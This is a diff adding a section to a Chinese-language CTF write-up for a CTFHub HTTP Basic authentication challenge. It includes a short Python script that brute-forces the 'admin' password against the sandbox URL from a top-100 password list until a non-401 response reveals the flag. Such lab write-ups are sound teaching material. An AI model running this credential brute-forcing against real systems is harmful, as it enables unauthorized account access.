@@ -94,3 +94,36 @@ print(req.text)
 ```
 
 即可获得flag
+
+# 基础认证
+
+## 题目
+
+在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP基本认证<br>常规给出url<br>一个录有100个密码的密码本
+
+## 解题过程
+
+通过终端`curl -v [url]`得到：
+
+<img src="https://tvax4.sinaimg.cn/large/007Z9xVHgy1h7b143s60vj31dd0ql7wh.jpg" alt="http基本认证" width="1777" data-width="1777" data-height="957">
+
+`www-authenticate` 那一行提示到用户名可能是 `admin`
+
+写一个py遍历一下密码本：
+```python
+import requests
+
+url = "http://challenge-153f9b191245ba0f.sandbox.ctfhub.com:10800/flag.html"
+while (1):
+    with open("10_million_password_list_top_100.txt", "r",
+              encoding="utf-8") as f:
+        for pwd in f.readlines():
+            print(pwd.strip())
+            req = requests.get(url, auth=('admin', pwd.strip()))
+            if req.status_code != 401:
+                print(req.text)
+                break
+        break
+```
+
+得到flag
